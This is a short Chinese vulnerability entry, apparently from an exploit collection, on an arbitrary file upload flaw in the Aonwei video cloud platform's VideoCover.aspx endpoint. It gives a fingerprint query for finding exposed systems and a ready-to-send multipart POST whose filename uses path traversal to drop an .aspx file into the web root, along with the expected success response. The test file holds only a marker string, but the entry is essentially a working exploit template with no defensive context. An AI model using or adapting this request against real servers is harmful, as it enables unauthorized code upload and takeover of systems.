# 奥威亚-视频云平台-VideoCover.aspx-任意文件上传漏洞

- **系统**：奥威亚-视频云平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="Copyright © 2005-2018 广州市奥威亚电子科技有限公司"`
- **请求**：`POST /Tools/Video/VideoCover.aspx HTTP/1.1`
- **关键头**：`Sec-GPC: 1`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHT…`

**请求体 / payload**
```
------WebKitFormBoundaryLx7ATxHThfk91oxQ
Content-Disposition: form-data; name="file"; filename="/../../../AVA.Resourcesplatform.webUI/dudesuite.aspx"
Content-Type: image/jpeg
dudesuite
------WebKitFormBoundaryLx7ATxHThfk91oxQ-
```
- **预期**：200　|　success